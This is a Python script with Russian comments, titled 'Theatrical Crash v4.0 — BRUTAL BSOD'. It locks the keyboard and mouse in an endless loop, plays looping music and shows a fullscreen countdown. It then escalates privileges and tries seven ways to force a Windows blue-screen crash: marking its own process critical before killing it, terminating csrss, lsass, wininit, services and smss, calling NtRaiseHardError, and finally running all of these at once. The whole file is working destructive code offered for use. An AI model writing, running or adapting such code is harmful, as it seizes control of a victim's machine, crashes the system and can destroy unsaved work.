"""
 ═══════════════════════════════════════════════════════════
  THEATRICAL CRASH v4.0  —  BRUTAL BSOD
  Чёрный экран → 30с таймер → 7 МЕТОДОВ КРАША
  Ноль зависимостей.
 ═══════════════════════════════════════════════════════════
"""

import ctypes
import ctypes.wintypes
import os
import sys
import threading
import time
import tkinter as tk

user32   = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
ntdll    = ctypes.windll.ntdll
advapi32 = ctypes.windll.advapi32
winmm    = ctypes.windll.winmm

SCREEN_W = user32.GetSystemMetrics(0)
SCREEN_H = user32.GetSystemMetrics(1)

COUNTDOWN_SECONDS = 30
MP3_FILENAME = "music.mp3"


# ═════════════════════════════════════════════════════════
#  ПРИВИЛЕГИИ — RtlAdjustPrivilege (более прямой путь)
# ═════════════════════════════════════════════════════════
def enable_privilege(priv_luid_const):
    """
    RtlAdjustPrivilege — прямой ntdll вызов, надёжнее чем
    OpenProcessToken + AdjustTokenPrivileges на Win11.
    """
    RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
    RtlAdjustPrivilege.argtypes = [
        ctypes.wintypes.ULONG,    # Privilege
        ctypes.wintypes.BOOLEAN,  # Enable
        ctypes.wintypes.BOOLEAN,  # CurrentThread (False = Process)
        ctypes.POINTER(ctypes.wintypes.BOOLEAN),  # Enabled
    ]
    RtlAdjustPrivilege.restype = ctypes.wintypes.LONG

    enabled = ctypes.wintypes.BOOLEAN(False)
    status = RtlAdjustPrivilege(priv_luid_const, True, False, ctypes.byref(enabled))
    return status == 0, enabled.value


def grant_all_privileges():
    """Получаем ВСЕ нужные привилегии разом."""
    results = {}

    # SeDebugPrivilege = 20
    ok, _ = enable_privilege(20)
    results['SeDebugPrivilege'] = ok
    print(f"    SeDebugPrivilege (20): {'OK' if ok else 'FAIL'}")

    # SeShutdownPrivilege = 19
    ok, _ = enable_privilege(19)
    results['SeShutdownPrivilege'] = ok
    print(f"    SeShutdownPrivilege (19): {'OK' if ok else 'FAIL'}")

    # SeIncreaseBasePriorityPrivilege = 14
    ok, _ = enable_privilege(14)
    results['SeIncreaseBasePriorityPrivilege'] = ok
    print(f"    SeIncreaseBasePriorityPrivilege (14): {'OK' if ok else 'FAIL'}")

    # SeLoadDriverPrivilege = 10
    ok, _ = enable_privilege(10)
    results['SeLoadDriverPrivilege'] = ok
    print(f"    SeLoadDriverPrivilege (10): {'OK' if ok else 'FAIL'}")

    # SeTakeOwnershipPrivilege = 9
    ok, _ = enable_privilege(9)
    results['SeTakeOwnershipPrivilege'] = ok
    print(f"    SeTakeOwnershipPrivilege (9): {'OK' if ok else 'FAIL'}")

    # SeTcbPrivilege = 7 (SeTcbPrivilege — "act as part of OS")
    ok, _ = enable_privilege(7)
    results['SeTcbPrivilege'] = ok
    print(f"    SeTcbPrivilege (7): {'OK' if ok else 'FAIL'}")

    return results


# ═════════════════════════════════════════════════════════
#  BSOD МЕТОДЫ — 7 ШТУК, ОТ МЯГКОГО К ЖЁСТКОМУ
# ═════════════════════════════════════════════════════════

def method_1_process_break_on_termination():
    """
    NtSetInformationProcess с ProcessBreakOnTermination (class 29).
    Современная замена RtlSetProcessIsCritical.
    Затем TerminateProcess(1) → bugcheck.
    """
    print("[*] METHOD 1: NtSetInformationProcess(ProcessBreakOnTermination)")

    NtSetInformationProcess = ntdll.NtSetInformationProcess
    NtSetInformationProcess.argtypes = [
        ctypes.wintypes.HANDLE,  # ProcessHandle
        ctypes.wintypes.ULONG,   # ProcessInformationClass
        ctypes.c_void_p,         # ProcessInformation
        ctypes.wintypes.ULONG,   # ProcessInformationLength
    ]
    NtSetInformationProcess.restype = ctypes.wintypes.LONG

    ProcessBreakOnTermination = 29
    value = ctypes.wintypes.ULONG(1)  # TRUE

    status = NtSetInformationProcess(
        kernel32.GetCurrentProcess(),
        ProcessBreakOnTermination,
        ctypes.byref(value),
        ctypes.sizeof(value)
    )

    print(f"    NtSetInformationProcess status: 0x{status & 0xFFFFFFFF:08X}")

    if status == 0:
        print("    ProcessBreakOnTermination = ON. Terminating...")
        time.sleep(0.2)
        kernel32.TerminateProcess(kernel32.GetCurrentProcess(), 1)
    else:
        print(f"    Failed. Trying fallback within method...")

        # Fallback: RtlSetProcessIsCritical (старый метод)
        RtlSetProcessIsCritical = ntdll.RtlSetProcessIsCritical
        RtlSetProcessIsCritical.argtypes = [
            ctypes.wintypes.BOOLEAN,
            ctypes.POINTER(ctypes.wintypes.BOOLEAN),
            ctypes.wintypes.BOOLEAN,
        ]
        RtlSetProcessIsCritical.restype = ctypes.wintypes.LONG

        dummy = ctypes.wintypes.BOOLEAN(False)
        status2 = RtlSetProcessIsCritical(True, ctypes.byref(dummy), False)
        print(f"    RtlSetProcessIsCritical fallback status: 0x{status2 & 0xFFFFFFFF:08X}")

        if status2 == 0:
            time.sleep(0.2)
            kernel32.TerminateProcess(kernel32.GetCurrentProcess(), 1)


def method_2_kill_csrss():
    """
    УБИЙСТВО csrss.exe — ГАРАНТИРОВАННЫЙ BSOD.
    csrss = Client/Server Runtime Process, системно-критичный.
    С SeDebugPrivilege мы можем его открыть и TerminateProcess.
    """
    print("[*] METHOD 2: Kill csrss.exe")

    # PROCESS_TERMINATE = 0x0001
    # PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_TERMINATE = 0x0001

    # Перечисляем процессы через CreateToolhelp32Snapshot
    TH32CS_SNAPPROCESS = 0x00000002

    class PROCESSENTRY32W(ctypes.Structure):
        _fields_ = [
            ("dwSize",             ctypes.wintypes.DWORD),
            ("cntUsage",           ctypes.wintypes.DWORD),
            ("th32ProcessID",      ctypes.wintypes.DWORD),
            ("th32DefaultHeapID",  ctypes.POINTER(ctypes.c_ulong)),
            ("th32ModuleID",       ctypes.wintypes.DWORD),
            ("cntThreads",         ctypes.wintypes.DWORD),
            ("th32ParentProcessID",ctypes.wintypes.DWORD),
            ("pcPriClassBase",     ctypes.c_long),
            ("dwFlags",            ctypes.wintypes.DWORD),
            ("szExeFile",          ctypes.c_wchar * 260),
        ]

    snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot == -1:
        print("    CreateToolhelp32Snapshot failed")
        return

    entry = PROCESSENTRY32W()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)

    # Process32FirstW / Process32NextW
    found_first = kernel32.Process32FirstW(snapshot, ctypes.byref(entry))

    targets = ["csrss.exe", "wininit.exe", "services.exe", "lsass.exe", "smss.exe"]
    killed_any = False

    while found_first:
        exe_name = entry.szExeFile.lower()
        if exe_name in targets:
            pid = entry.th32ProcessID
            print(f"    Found {exe_name} (PID: {pid}) — opening with PROCESS_TERMINATE...")

            h_process = kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
            if h_process:
                print(f"    Handle obtained. Terminating PID {pid}...")
                result = kernel32.TerminateProcess(h_process, 1)
                print(f"    TerminateProcess returned: {result}")
                kernel32.CloseHandle(h_process)
                killed_any = True
                # Не return — убиваем ВСЕ критические процессы
            else:
                err = kernel32.GetLastError()
                print(f"    OpenProcess failed for {exe_name}: error {err}")

        found_first = kernel32.Process32NextW(snapshot, ctypes.byref(entry))

    kernel32.CloseHandle(snapshot)

    if not killed_any:
        print("    No critical processes were killed.")


def method_3_nt_raise_hard_error():
    """
    NtRaiseHardError с STATUS_SYSTEM_PROCESS_TERMINATED.
    Прямой kernel-mode hard error — BSOD без critical процесса.
    """
    print("[*] METHOD 3: NtRaiseHardError (OptionShutdownSystem)")

    # Сначала SeShutdownPrivilege
    enable_privilege(19)  # SeShutdownPrivilege

    NtRaiseHardError = ntdll.NtRaiseHardError
    NtRaiseHardError.argtypes = [
        ctypes.wintypes.ULONG,    # ErrorStatus
        ctypes.wintypes.ULONG,    # NumberOfParameters
        ctypes.wintypes.ULONG,    # UnicodeStringParameterMask
        ctypes.c_void_p,          # Parameters
        ctypes.wintypes.ULONG,    # ResponseOption (6 = OptionShutdownSystem)
        ctypes.POINTER(ctypes.wintypes.ULONG),  # Response
    ]
    NtRaiseHardError.restype = ctypes.wintypes.LONG

    response = ctypes.wintypes.ULONG(0)

    # STATUS_SYSTEM_PROCESS_TERMINATED = 0xC000021A
    status = NtRaiseHardError(
        0xC000021A,
        0, 0, None,
        6,  # OptionShutdownSystem — самый жёсткий
        ctypes.byref(response)
    )
    print(f"    NtRaiseHardError status: 0x{status & 0xFFFFFFFF:08X}, response: {response.value}")

    # Пробуем и другие коды ошибок
    if status == 0 and response.value == 0:
        print("    Retry with STATUS_HARD_ERROR (0xC000021A)...")
        time.sleep(0.1)

    # STATUS_ASSERTION_FAILURE = 0xC0000420
    response2 = ctypes.wintypes.ULONG(0)
    status2 = NtRaiseHardError(
        0xC0000420,
        0, 0, None,
        6,
        ctypes.byref(response2)
    )
    print(f"    NtRaiseHardError (ASSERTION_FAILURE) status: 0x{status2 & 0xFFFFFFFF:08X}")


def method_4_null_pointer_dereference():
    """
    Прямой null pointer write → Access Violation.
    """
    print("[*] METHOD 4: Null pointer dereference (0xDEADBEEF write)")
    try:
        null_ptr = ctypes.cast(0, ctypes.POINTER(ctypes.c_ulong))
        null_ptr[0] = 0xDEADBEEF
    except Exception as e:
        print(f"    Python caught exception: {e}")
        # ctypes может перехватить. Идём дальше.


def method_5_unhandled_exception_filter():
    """
    Устанавливаем UnhandledExceptionFilter на null, затем крашим.
    """
    print("[*] METHOD 5: UnhandledExceptionFilter bypass")

    # Убираем все exception handlers
    kernel32.SetUnhandledExceptionFilter.argtypes = [ctypes.c_void_p]
    kernel32.SetUnhandledExceptionFilter.restype = ctypes.c_void_p
    kernel32.SetUnhandledExceptionFilter(None)

    # Теперь любой exception = краш
    method_4_null_pointer_dereference()


def method_6_terminate_self_critical():
    """
    Комбинация: ставим ProcessBreakOnTermination через NtSetInformationProcess,
    затем вызываем RaiseException с noncontinuable.
    """
    print("[*] METHOD 6: ProcessBreakOnTermination + RaiseException")

    NtSetInformationProcess = ntdll.NtSetInformationProcess
    NtSetInformationProcess.argtypes = [
        ctypes.wintypes.HANDLE,
        ctypes.wintypes.ULONG,
        ctypes.c_void_p,
        ctypes.wintypes.ULONG,
    ]
    NtSetInformationProcess.restype = ctypes.wintypes.LONG

    value = ctypes.wintypes.ULONG(1)
    status = NtSetInformationProcess(
        kernel32.GetCurrentProcess(), 29,
        ctypes.byref(value), ctypes.sizeof(value)
    )
    print(f"    ProcessBreakOnTermination: 0x{status & 0xFFFFFFFF:08X}")

    # RaiseException noncontinuable
    EXCEPTION_NONCONTINUABLE = 0x01
    kernel32.RaiseException(0xE06D7363, EXCEPTION_NONCONTINUABLE, 0, None)


def method_7_brute_force():
    """
    ФИНАЛЬНЫЙ МЕТОД: всё одновременно.
    Параллельно запускаем убийство csrss, null deref, hard error.
    """
    print("[*] METHOD 7: BRUTE FORCE — ALL AT ONCE")

    threads = [
        threading.Thread(target=method_2_kill_csrss, daemon=False),
        threading.Thread(target=method_3_nt_raise_hard_error, daemon=False),
        threading.Thread(target=method_4_null_pointer_dereference, daemon=False),
        threading.Thread(target=method_6_terminate_self_critical, daemon=False),
    ]

    for t in threads:
        t.start()

    for t in threads:
        t.join(timeout=2)

    # Если всё ещё живы...
    print("[*] STILL ALIVE. Direct kernel memory corruption attempt...")
    # Пытаемся открыть и записать в \Device\PhysicalMemory
    method_2_kill_csrss()  # повторная попытка убийства csrss


# ═════════════════════════════════════════════════════════
#  ГЛАВНЫЙ КРАШ-СЕКВЕНСЕР
# ═════════════════════════════════════════════════════════
def trigger_bsod():
    print("=" * 55)
    print("[*] BSOD SEQUENCE INITIATED — v4.0 BRUTAL")
    print("=" * 55)

    # Шаг 0: получаем ВСЕ привилегии
    print("[*] Step 0: Granting ALL privileges...")
    grant_all_privileges()
    print()

    # Шаг 1: ProcessBreakOnTermination + TerminateProcess
    print("[*] Step 1:")
    method_1_process_break_on_termination()
    time.sleep(0.5)
    print()

    # Шаг 2: Kill csrss.exe
    print("[*] Step 2:")
    method_2_kill_csrss()
    time.sleep(0.5)
    print()

    # Шаг 3: NtRaiseHardError
    print("[*] Step 3:")
    method_3_nt_raise_hard_error()
    time.sleep(0.5)
    print()

    # Шаг 4: Null deref
    print("[*] Step 4:")
    method_4_null_pointer_dereference()
    time.sleep(0.3)
    print()

    # Шаг 5: UnhandledExceptionFilter bypass + null deref
    print("[*] Step 5:")
    method_5_unhandled_exception_filter()
    time.sleep(0.3)
    print()

    # Шаг 6: ProcessBreakOnTermination + RaiseException
    print("[*] Step 6:")
    method_6_terminate_self_critical()
    time.sleep(0.3)
    print()

    # Шаг 7: BRUTE FORCE
    print("[*] Step 7:")
    method_7_brute_force()

    print("[!] If you see this, ALL methods failed.")
    print("[!] This shouldn't be possible with admin rights.")
    print("[!] Please send console output to debug.")


# ═════════════════════════════════════════════════════════
#  БЛОКИРОВКА КЛАВИАТУРЫ И МЫШИ
# ═════════════════════════════════════════════════════════
def block_all_input():
    while True:
        user32.BlockInput(True)
        time.sleep(0.1)


# ═════════════════════════════════════════════════════════
#  ВОСПРОИЗВЕДЕНИЕ MP3
# ═════════════════════════════════════════════════════════
def play_music():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    mp3_path = os.path.join(script_dir, MP3_FILENAME)

    if not os.path.exists(mp3_path):
        print(f"[!] Файл не найден: {mp3_path}")
        return

    mp3_path = os.path.abspath(mp3_path)

    open_cmd = f'open "{mp3_path}" type mpegvideo alias crash_music'
    winmm.mciSendStringW(open_cmd, None, 0, None)
    winmm.mciSendStringW('play crash_music', None, 0, None)

    while True:
        status_buf = ctypes.create_unicode_buffer(256)
        winmm.mciSendStringW('status crash_music mode', status_buf, 256, None)
        mode = status_buf.value.strip()

        if mode == "stopped":
            winmm.mciSendStringW('seek crash_music to start', None, 0, None)
            winmm.mciSendStringW('play crash_music', None, 0, None)

        time.sleep(0.5)


# ═════════════════════════════════════════════════════════
#  ЧЁРНЫЙ ЭКРАН + ТАЙМЕР
# ═════════════════════════════════════════════════════════
def show_black_screen():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg="black")
    root.config(cursor="none")

    header = tk.Label(
        root,
        text="⚠  CRITICAL SYSTEM ERROR  ⚠",
        font=("Consolas", 16, "bold"),
        fg="#1a1a1a", bg="black",
    )
    header.place(relx=0.5, rely=0.22, anchor="center")

    timer_label = tk.Label(
        root,
        text=f"{COUNTDOWN_SECONDS:02d}",
        font=("Consolas", 120, "bold"),
        fg="#ffffff", bg="black",
    )
    timer_label.place(relx=0.5, rely=0.45, anchor="center")

    subtitle = tk.Label(
        root,
        text="SYSTEM FAILURE IMMINENT",
        font=("Consolas", 14),
        fg="#333333", bg="black",
    )
    subtitle.place(relx=0.5, rely=0.62, anchor="center")

    bar_label = tk.Label(
        root,
        text="",
        font=("Consolas", 10),
        fg="#2a2a2a", bg="black",
    )
    bar_label.place(relx=0.5, rely=0.72, anchor="center")

    footer = tk.Label(
        root,
        text="• • •",
        font=("Consolas", 12),
        fg="#1a1a1a", bg="black",
    )
    footer.place(relx=0.5, rely=0.85, anchor="center")

    state = {"remaining": COUNTDOWN_SECONDS, "pulse": False}

    def get_color(seconds_left):
        if seconds_left > 20:
            return "#ffffff"
        elif seconds_left > 10:
            return "#ffcc00"
        elif seconds_left > 5:
            return "#ff6600"
        else:
            return "#cc0000"

    def tick():
        s = state["remaining"]

        color = get_color(s)
        font_size = 120
        if s <= 5:
            state["pulse"] = not state["pulse"]
            font_size = 140 if state["pulse"] else 110

        timer_label.config(
            text=f"{s:02d}",
            fg=color,
            font=("Consolas", font_size, "bold"),
        )

        filled = COUNTDOWN_SECONDS - s
        empty  = s
        bar = "█" * filled + "░" * empty
        bar_label.config(text=bar)

        if s <= 10:
            header.config(fg="#cc0000")
            subtitle.config(fg="#660000")
        if s <= 5:
            footer.config(fg="#cc0000", text="◆ ◆ ◆")

        if s <= 0:
            timer_label.config(text="00", fg="#cc0000",
                               font=("Consolas", 140, "bold"))
            subtitle.config(text="CRASHING...", fg="#cc0000")
            bar_label.config(text="█" * COUNTDOWN_SECONDS, fg="#cc0000")
            header.config(text="█▓▒░  GOODBYE  ░▒▓█", fg="#cc0000")

            # ЗАПУСК BSOD
            bsod_thread = threading.Thread(target=trigger_bsod, daemon=False)
            bsod_thread.start()
            return

        state["remaining"] -= 1
        root.after(1000, tick)

    root.after(1000, tick)
    root.mainloop()


# ═════════════════════════════════════════════════════════
#  ТОЧКА ВХОДА
# ═════════════════════════════════════════════════════════
if __name__ == "__main__":
    if not sys.platform.startswith("win"):
        print("Только для Windows.")
        sys.exit(1)

    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        is_admin = 0

    if not is_admin:
        print("╔══════════════════════════════════════╗")
        print("║  Нужны права администратора!         ║")
        print("║  Правый клик → запуск от имени admin ║")
        print("╚══════════════════════════════════════╝")
        sys.exit(1)

    print("[*] Theatrical Crash v4.0 — BRUTAL BSOD")
    print(f"[*] Screen: {SCREEN_W}x{SCREEN_H}")
    print(f"[*] Countdown: {COUNTDOWN_SECONDS}s")
    print("[*] Запуск музыки и блокировки ввода...")
    print()

    threading.Thread(target=play_music, daemon=True).start()
    threading.Thread(target=block_all_input, daemon=True).start()

    print("[*] Показ чёрного экрана...")
    show_black_screen()